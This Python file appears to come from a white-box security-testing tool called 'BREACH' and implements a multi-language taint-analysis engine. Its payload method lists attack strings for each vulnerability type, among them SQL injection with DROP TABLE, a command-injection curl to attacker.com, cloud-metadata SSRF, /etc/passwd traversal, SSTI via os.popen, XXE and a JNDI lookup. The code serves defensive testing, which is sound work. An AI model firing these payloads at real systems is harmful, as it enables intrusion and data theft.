"""
BREACH - Data Flow Analysis Engine
===================================

Advanced taint analysis that traces data from user-controlled sources
to dangerous sinks across multiple programming languages.

This is the core of white-box security testing - understanding HOW
data flows through an application to identify exploitable paths.
"""

import re
import os
import asyncio
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path
from enum import Enum


class VulnType(Enum):
    """Vulnerability types detected through data flow analysis."""
    SQLI = "sqli"
    XSS = "xss"
    CMDI = "cmdi"
    SSRF = "ssrf"
    LFI = "lfi"
    SSTI = "ssti"
    DESERIALIZATION = "deserialization"
    XXE = "xxe"
    OPEN_REDIRECT = "open_redirect"
    PATH_TRAVERSAL = "path_traversal"
    NOSQL = "nosql"
    LDAP = "ldap"
    XPATH = "xpath"
    HEADER_INJECTION = "header_injection"
    LOG_INJECTION = "log_injection"


@dataclass
class TaintSource:
    """A source of user-controlled (tainted) data."""
    name: str
    type: str  # query_param, body, header, cookie, path_param, etc.
    file_path: str
    line_number: int
    code_snippet: str
    variable_name: Optional[str] = None
    confidence: float = 1.0


@dataclass
class TaintSink:
    """A dangerous sink where tainted data causes vulnerabilities."""
    name: str
    vuln_type: VulnType
    file_path: str
    line_number: int
    code_snippet: str
    function_name: Optional[str] = None
    severity: str = "HIGH"


@dataclass
class TaintedFlow:
    """A complete data flow from source to sink."""
    source: TaintSource
    sink: TaintSink
    path: List[str]  # Variable names/transformations in between
    vuln_type: VulnType
    confidence: float
    file_path: str
    start_line: int
    end_line: int
    code_context: str
    is_sanitized: bool = False
    sanitizer: Optional[str] = None
    payloads: List[str] = field(default_factory=list)

    @property
    def severity(self) -> str:
        """Calculate severity based on confidence and vuln type."""
        critical_types = {VulnType.SQLI, VulnType.CMDI, VulnType.DESERIALIZATION, VulnType.SSRF}
        if self.vuln_type in critical_types and self.confidence > 0.7:
            return "CRITICAL"
        elif self.confidence > 0.6:
            return "HIGH"
        elif self.confidence > 0.4:
            return "MEDIUM"
        return "LOW"


@dataclass
class FlowAnalysisResult:
    """Complete result of data flow analysis."""
    target: str
    files_analyzed: int
    total_lines: int
    sources_found: List[TaintSource]
    sinks_found: List[TaintSink]
    tainted_flows: List[TaintedFlow]
    technologies_detected: Dict[str, str]
    analysis_time_ms: float

    @property
    def critical_flows(self) -> List[TaintedFlow]:
        return [f for f in self.tainted_flows if f.severity == "CRITICAL"]

    @property
    def high_flows(self) -> List[TaintedFlow]:
        return [f for f in self.tainted_flows if f.severity == "HIGH"]


class DataFlowGraph:
    """
    A graph representation of data flow in the application.

    Nodes are variables/expressions.
    Edges represent data flow (assignment, function call, etc.)
    """

    def __init__(self):
        self.nodes: Dict[str, Dict] = {}  # node_id -> node data
        self.edges: List[Tuple[str, str, str]] = []  # (from, to, type)
        self.sources: Set[str] = set()
        self.sinks: Set[str] = set()

    def add_node(self, node_id: str, data: Dict):
        """Add a node to the graph."""
        self.nodes[node_id] = data

    def add_edge(self, from_node: str, to_node: str, edge_type: str = "flow"):
        """Add a directed edge between nodes."""
        self.edges.append((from_node, to_node, edge_type))

    def mark_source(self, node_id: str):
        """Mark a node as a taint source."""
        self.sources.add(node_id)

    def mark_sink(self, node_id: str):
        """Mark a node as a taint sink."""
        self.sinks.add(node_id)

    def find_paths(self, source: str, sink: str, max_depth: int = 10) -> List[List[str]]:
        """Find all paths from source to sink using BFS."""
        if source not in self.nodes or sink not in self.nodes:
            return []

        # Build adjacency list
        adj: Dict[str, List[str]] = {n: [] for n in self.nodes}
        for from_n, to_n, _ in self.edges:
            if from_n in adj:
                adj[from_n].append(to_n)

        # BFS to find all paths
        paths = []
        queue = [(source, [source])]

        while queue and len(paths) < 100:  # Limit paths
            current, path = queue.pop(0)

            if len(path) > max_depth:
                continue

            if current == sink:
                paths.append(path)
                continue

            for neighbor in adj.get(current, []):
                if neighbor not in path:  # Avoid cycles
                    queue.append((neighbor, path + [neighbor]))

        return paths

    def get_tainted_paths(self) -> List[Tuple[str, str, List[str]]]:
        """Find all paths from sources to sinks."""
        tainted_paths = []
        for source in self.sources:
            for sink in self.sinks:
                paths = self.find_paths(source, sink)
                for path in paths:
                    tainted_paths.append((source, sink, path))
        return tainted_paths


class DataFlowAnalyzer:
    """
    Multi-language data flow analyzer.

    Performs taint analysis across source code to identify
    exploitable data flows from user input to dangerous sinks.
    """

    # File extensions to language mapping
    LANG_EXTENSIONS = {
        ".py": "python",
        ".js": "javascript",
        ".ts": "typescript",
        ".tsx": "typescript",
        ".jsx": "javascript",
        ".go": "go",
        ".java": "java",
        ".php": "php",
        ".rb": "ruby",
        ".rs": "rust",
        ".cs": "csharp",
    }

    # Directories to skip
    SKIP_DIRS = {
        "node_modules", "vendor", "venv", ".venv", "__pycache__",
        ".git", ".svn", "dist", "build", "target", ".idea",
        "coverage", ".pytest_cache", ".mypy_cache",
    }

    def __init__(
        self,
        max_files: int = 500,
        max_file_size: int = 1_000_000,  # 1MB
        max_depth: int = 20,
    ):
        self.max_files = max_files
        self.max_file_size = max_file_size
        self.max_depth = max_depth
        self._analyzers: Dict[str, 'LanguageAnalyzer'] = {}

    def _get_analyzer(self, language: str) -> Optional['LanguageAnalyzer']:
        """Get or create language-specific analyzer."""
        if language not in self._analyzers:
            from breach.source.languages import (
                PythonAnalyzer,
                JavaScriptAnalyzer,
                GoAnalyzer,
                JavaAnalyzer,
                PHPAnalyzer,
                RubyAnalyzer,
            )

            analyzers = {
                "python": PythonAnalyzer,
                "javascript": JavaScriptAnalyzer,
                "typescript": JavaScriptAnalyzer,  # Same patterns mostly
                "go": GoAnalyzer,
                "java": JavaAnalyzer,
                "php": PHPAnalyzer,
                "ruby": RubyAnalyzer,
            }

            if language in analyzers:
                self._analyzers[language] = analyzers[language]()

        return self._analyzers.get(language)

    async def analyze_directory(
        self,
        path: str,
        target_url: Optional[str] = None,
    ) -> FlowAnalysisResult:
        """
        Analyze all source files in a directory.

        Args:
            path: Path to source code directory
            target_url: Optional target URL for context

        Returns:
            FlowAnalysisResult with all discovered flows
        """
        import time
        start_time = time.time()

        path = Path(path)
        if not path.exists():
            return FlowAnalysisResult(
                target=target_url or str(path),
                files_analyzed=0,
                total_lines=0,
                sources_found=[],
                sinks_found=[],
                tainted_flows=[],
                technologies_detected={},
                analysis_time_ms=0,
            )

        # Collect files to analyze
        files_to_analyze = []
        for ext, lang in self.LANG_EXTENSIONS.items():
            for file_path in path.rglob(f"*{ext}"):
                # Skip unwanted directories
                if any(skip in file_path.parts for skip in self.SKIP_DIRS):
                    continue
                # Skip large files
                if file_path.stat().st_size > self.max_file_size:
                    continue
                files_to_analyze.append((file_path, lang))
                if len(files_to_analyze) >= self.max_files:
                    break

        # Analyze files
        all_sources: List[TaintSource] = []
        all_sinks: List[TaintSink] = []
        all_flows: List[TaintedFlow] = []
        technologies: Dict[str, str] = {}
        total_lines = 0

        for file_path, language in files_to_analyze:
            try:
                content = file_path.read_text(encoding="utf-8", errors="ignore")
                lines = content.count("\n") + 1
                total_lines += lines

                analyzer = self._get_analyzer(language)
                if analyzer:
                    sources, sinks, flows = analyzer.analyze(
                        content,
                        str(file_path),
                    )
                    all_sources.extend(sources)
                    all_sinks.extend(sinks)
                    all_flows.extend(flows)

                    # Detect technologies
                    techs = analyzer.detect_technologies(content)
                    technologies.update(techs)

            except Exception as e:
                continue

        # Sort flows by confidence
        all_flows.sort(key=lambda f: f.confidence, reverse=True)

        # Generate payloads for each flow
        for flow in all_flows:
            flow.payloads = self._generate_payloads(flow.vuln_type)

        return FlowAnalysisResult(
            target=target_url or str(path),
            files_analyzed=len(files_to_analyze),
            total_lines=total_lines,
            sources_found=all_sources,
            sinks_found=all_sinks,
            tainted_flows=all_flows,
            technologies_detected=technologies,
            analysis_time_ms=(time.time() - start_time) * 1000,
        )

    async def analyze_file(
        self,
        file_path: str,
        content: Optional[str] = None,
    ) -> Tuple[List[TaintSource], List[TaintSink], List[TaintedFlow]]:
        """Analyze a single file."""
        path = Path(file_path)
        ext = path.suffix.lower()

        language = self.LANG_EXTENSIONS.get(ext)
        if not language:
            return [], [], []

        if content is None:
            content = path.read_text(encoding="utf-8", errors="ignore")

        analyzer = self._get_analyzer(language)
        if not analyzer:
            return [], [], []

        return analyzer.analyze(content, file_path)

    def _generate_payloads(self, vuln_type: VulnType) -> List[str]:
        """Generate exploitation payloads for vulnerability type."""
        payloads = {
            VulnType.SQLI: [
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL,NULL--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "1; DROP TABLE users--",
            ],
            VulnType.XSS: [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
            ],
            VulnType.CMDI: [
                "; id",
                "| whoami",
                "`id`",
                "$(cat /etc/passwd)",
                "&& curl http://attacker.com/$(whoami)",
            ],
            VulnType.SSRF: [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:22",
                "http://localhost:6379",
                "file:///etc/passwd",
                "gopher://localhost:6379/_INFO",
            ],
            VulnType.LFI: [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php",
                "..\\..\\..\\windows\\win.ini",
            ],
            VulnType.SSTI: [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            ],
            VulnType.DESERIALIZATION: [
                'O:8:"stdClass":0:{}',
                '{"@type":"java.lang.Runtime"}',
                '__import__("os").system("id")',
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
            ],
            VulnType.OPEN_REDIRECT: [
                "//evil.com",
                "https://evil.com",
                "/\\evil.com",
                "https:evil.com",
            ],
            VulnType.PATH_TRAVERSAL: [
                "../../../etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "....//....//etc/passwd",
            ],
            VulnType.NOSQL: [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "1==1"}',
                '{"$regex": ".*"}',
            ],
            VulnType.XXE: [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>',
            ],
            VulnType.LDAP: [
                "*)(uid=*))(|(uid=*",
                "admin)(&)",
                "*)(objectClass=*",
            ],
            VulnType.XPATH: [
                "' or '1'='1",
                "' or ''='",
                "admin' or '1'='1",
            ],
            VulnType.HEADER_INJECTION: [
                "\r\nX-Injected: header",
                "%0d%0aX-Injected: header",
                "\nSet-Cookie: admin=true",
            ],
            VulnType.LOG_INJECTION: [
                "\n[CRITICAL] Fake log entry",
                "${jndi:ldap://attacker.com/a}",
                "{{config}}",
            ],
        }

        return payloads.get(vuln_type, [])

    def build_flow_graph(
        self,
        result: FlowAnalysisResult,
    ) -> DataFlowGraph:
        """Build a data flow graph from analysis results."""
        graph = DataFlowGraph()

        # Add sources as nodes
        for source in result.sources_found:
            node_id = f"source:{source.file_path}:{source.line_number}"
            graph.add_node(node_id, {
                "type": "source",
                "name": source.name,
                "source_type": source.type,
            })
            graph.mark_source(node_id)

        # Add sinks as nodes
        for sink in result.sinks_found:
            node_id = f"sink:{sink.file_path}:{sink.line_number}"
            graph.add_node(node_id, {
                "type": "sink",
                "name": sink.name,
                "vuln_type": sink.vuln_type.value,
            })
            graph.mark_sink(node_id)

        # Add edges from flows
        for flow in result.tainted_flows:
            source_id = f"source:{flow.source.file_path}:{flow.source.line_number}"
            sink_id = f"sink:{flow.sink.file_path}:{flow.sink.line_number}"

            # Add intermediate nodes from path
            prev_node = source_id
            for i, step in enumerate(flow.path):
                step_id = f"step:{flow.file_path}:{flow.start_line}:{i}"
                graph.add_node(step_id, {"type": "step", "name": step})
                graph.add_edge(prev_node, step_id, "flow")
                prev_node = step_id

            graph.add_edge(prev_node, sink_id, "flow")

        return graph


# Convenience function
async def analyze_source(
    path: str,
    target_url: Optional[str] = None,
) -> FlowAnalysisResult:
    """Quick analysis of source code directory."""
    analyzer = DataFlowAnalyzer()
    return await analyzer.analyze_directory(path, target_url)
